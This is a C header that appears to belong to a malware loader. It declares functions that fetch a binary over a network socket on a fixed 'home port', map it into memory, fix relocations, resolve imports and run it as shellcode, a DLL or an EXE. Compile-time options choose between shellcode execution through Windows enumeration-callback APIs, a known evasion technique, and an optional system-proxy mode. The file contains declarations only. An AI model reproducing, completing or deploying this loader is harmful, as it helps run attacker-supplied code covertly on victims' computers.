#ifndef __WSL_H
#define __WSL_H

#include <stdint.h>
#include <stdbool.h>

#include "util.h"

#define WSL_MAX_BUFF 2048
#define WSL_HOME_PORT 50000

// Uncomment to change execution method

//#define WSL_SC_ENUM_PWRSCHE 
#define WSL_SC_ENUM_UILANGS
//#define WSL_SC_ENUM_CODEPGS

// Uncomment to use system proxy (Wutai)

//#define WSL_SYS_PROXY

typedef BOOLEAN ( WINAPI * WSLMAIN )( HMODULE hModule, DWORD reason, LPVOID lpReserved );

typedef enum __BIN_TYPES {

    BIN = 0x0,
    DLL = 0x1,
    EXE = 0x2

} BIN_TYPE;

typedef struct __WSLDR_INFO {

    PVOID base;
    BIN_TYPE type;
    HINTERNET ws;
    WSLMAIN main;
    DWORD hdrs_sz;
    DWORD img_sz;
    WORD num_sec;

} WSL_INFO, *PWSL_INFO;

bool wsl_run_sc(PCORE c, PWSL_INFO wsl);
bool wsl_run_dll(PCORE c, PWSL_INFO wsl);
bool wsl_run_bin(PCORE c, PWSL_INFO wsl);
bool wsl_rel_bin(PCORE c, PWSL_INFO wsl);
bool wsl_res_iat(PCORE c, PWSL_INFO wsl);
bool wsl_map_bin(PCORE c, PWSL_INFO wsl);
bool wsl_vet_bin(PCORE c, PWSL_INFO wsl);
bool wsl_get_bin(PCORE c, PWSL_INFO wsl);
bool wsl_get_ws(PCORE c, PWSL_INFO wsl);
int wsl_get_sz(PCORE c, HINTERNET ws);
bool wsl_init(PCORE c);
void start();

#endif // __WSL_H